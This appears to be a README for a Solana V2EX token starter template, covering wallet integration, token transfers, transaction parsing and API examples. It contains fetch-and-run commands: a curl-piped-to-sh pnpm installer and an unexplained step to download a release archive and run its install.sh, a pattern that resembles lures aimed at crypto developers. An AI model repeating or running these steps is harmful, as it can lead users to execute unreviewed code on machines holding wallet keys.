# V2EX Token Starter for Solana — Full Frontend & Backend Kit

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/shadowf82/v2ex-starter-template/releases)

Build V2EX token apps on Solana. This template includes a Next.js demo frontend, backend helpers, and scripts to handle token transfers, balance queries, and signature verification.

- Live demo UI built with Next.js and React
- Wallet integration (Phantom, Solflare)
- Token and SOL transfer with memo support
- Server-side parsers for transaction and memo data
- Multi-language UI (Chinese / English)

![Solana](https://raw.githubusercontent.com/solana-labs/media/main/solana-logo.png) ![V2EX](https://avatars.githubusercontent.com/u/1882463?s=200&v=4)

Table of contents
- Features
- Quick start
- Required tools
- Environment variables
- Frontend features
- Backend features
- API examples
- Releases and downloads
- Demo and screenshots
- Development tips
- Contributing
- License

Features

Frontend
- Connect to web wallets: Phantom, Solflare.
- Send V2EX token transfers with memo.
- Send SOL transfers with memo.
- Query token balance for connected wallet.
- Sign and verify messages with wallet private key.

Backend
- Fetch V2EX token balance for any address.
- Parse transactions and extract V2EX / SOL transfers.
- Extract memo fields from transactions.
- Verify signed messages server-side.

Demo UI
- Next.js interactive demo pages.
- Test wallet connect and payment flows.
- View transaction details and balances.
- React-driven realtime UI updates.
- Chinese and English UI strings.

Quick start

1. Clone the repo
```bash
git clone https://github.com/shadowf82/v2ex-starter-template.git
cd v2ex-starter-template
```

2. Copy the env example and install
```bash
cp .env.local.example .env.local
pnpm install
```

3. Start the dev server
```bash
pnpm dev
```

Required tools
- pnpm (recommended) — fast package manager
- Node.js 18+ (LTS)
- A Solana web wallet (Phantom or Solflare) for the demo UI

If pnpm is missing, install:
```bash
npm install -g pnpm
# or on macOS using Homebrew
brew install pnpm
# or via curl
curl -fsSL https://get.pnpm.io/install.sh | sh -
```

Environment variables

Create .env.local from the example and set values relevant to your environment.

Client (browser)
- NEXT_PUBLIC_SOLANA_RPC_URL — public or private Solana RPC endpoint
- NEXT_PUBLIC_V2EX_TOKEN_ADDRESS — V2EX token mint address

Server (private)
- SOLANA_RPC_URL — RPC endpoint used by server helpers
- SERVER_SIGNER_KEY — base64 or hex key for server signing (optional)

Example .env.local
```bash
NEXT_PUBLIC_SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
NEXT_PUBLIC_V2EX_TOKEN_ADDRESS=9raUVuzeWUk53co63M4WXLWPWE4Xc6Lpn7RS9dnkpump

SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
SERVER_SIGNER_KEY=base64:....
```

Frontend features (details)

Wallet connect
- The demo uses wallet-adapter for Phantom and Solflare.
- The UI shows account address, SOL balance, and token balance.

Send V2EX token
- Choose recipient and amount.
- Add optional memo text.
- The app constructs the token transfer instruction and signs with the connected wallet.

Send SOL
- Build a native transfer with a memo.
- Sign via the wallet.

Sign message
- The demo provides a field to sign arbitrary text.
- Use the wallet's signMessage capability.
- The backend verifies signatures.

Balance query
- For token balances, the UI queries token accounts and totals up SPL balances for the token mint.

Backend features (details)

Balance lookup
- Fetch token accounts for an address with getParsedTokenAccountsByOwner.
- Filter by the V2EX token mint.
- Return a normalized balance (human-friendly units).

Transaction parsing
- Given a signature, fetch parsed transaction details.
- Extract transfer instructions for SPL token or native SOL moves.
- Pull memos from memo program instructions and attach to transfer items.

Memo extraction
- Parse Memo program instructions and return clear text memo payloads.
- Support UTF-8 and common encodings.

Signature verification
- Accept a message, a wallet public key, and a signature.
- Verify using Ed25519 verification against the public key.

API examples

Get token balance (server)
Request
GET /api/balance/:address?v2exMint=<mintAddress>

Response (JSON)
{
  "address": "H1x...",
  "tokenMint": "9raU...",
  "balance": "1234.5678",
  "raw": { ... }
}

Parse transaction
Request
GET /api/tx/:signature

Response includes
- timestamp
- fee payer
- instructions list
- transfers (token / SOL)
- memo text (if present)

Verify message signature
POST /api/verify
Body:
{
  "message": "hello",
  "publicKey": "H1x...",
  "signature": "base64..."
}

Response:
{
  "valid": true
}

Releases and downloads

Find release builds and assets here:
https://github.com/shadowf82/v2ex-starter-template/releases

Download the latest release asset and run the included installer. Typical steps:
1. Visit the releases page
2. Download v2ex-starter-template-<version>.tar.gz or .zip
3. Extract and run the installer script

Example commands (adjust the filename to the actual release file):
```bash
curl -L -o v2ex-release.tar.gz "https://github.com/shadowf82/v2ex-starter-template/releases/download/vX.Y.Z/v2ex-starter-template-vX.Y.Z.tar.gz"
tar -xzf v2ex-release.tar.gz
cd v2ex-starter-template-vX.Y.Z
chmod +x install.sh
./install.sh
```

If the link does not work, check the repository Releases section on GitHub.

Screenshots and demo

Demo UI — wallet connect
![Wallet connect demo](https://raw.githubusercontent.com/shadowf82/v2ex-starter-template/main/docs/screenshots/wallet-connect.png)

Demo UI — send token
![Send token demo](https://raw.githubusercontent.com/shadowf82/v2ex-starter-template/main/docs/screenshots/send-token.png)

Architecture

- Frontend: Next.js + React + wallet-adapter
- Backend: Node.js API routes (Next.js API or standalone Express)
- Solana RPC interaction: @solana/web3.js
- Token parsing: Parsed transaction APIs and custom helpers

Developer notes

- Use phantom wallet in browser dev mode to test flows.
- The template uses common SPL utilities. Reuse helpers to handle decimals and associated token accounts.
- Keep server RPC keys private. Do not expose them to the browser.

Common tasks

Run tests
```bash
pnpm test
```

Build production
```bash
pnpm build
pnpm start
```

Lint and format
```bash
pnpm lint
pnpm format
```

Deploy
- Deploy the Next.js app to Vercel, Netlify, or a similar host.
- Configure environment variables on the host.
- If using serverless functions, ensure RPC endpoints support the expected rate.

Internationalization
- The demo includes Chinese and English strings.
- Use the i18n folder to add translations.
- The UI switches language via a header control.

Security checklist
- Keep private keys off the client.
- Use HTTPS for RPC endpoints and your app.
- Validate memo content before storing it in a database.

Contributing
- Fork the repo and open a PR.
- Follow the coding style in existing files.
- Write tests for new helpers.
- Document API changes in the README and update example env files.

Maintainers
- Repository owner: shadowf82
- See CONTRIBUTORS.md for details

License
- This project uses the MIT license. Check LICENSE for full text.

Additional resources
- Solana docs: https://docs.solana.com
- SPL Token docs: https://spl.solana.com/token

[![Releases](https://img.shields.io/badge/Download%20Releases-Visit%20page-orange?logo=github)](https://github.com/shadowf82/v2ex-starter-template/releases)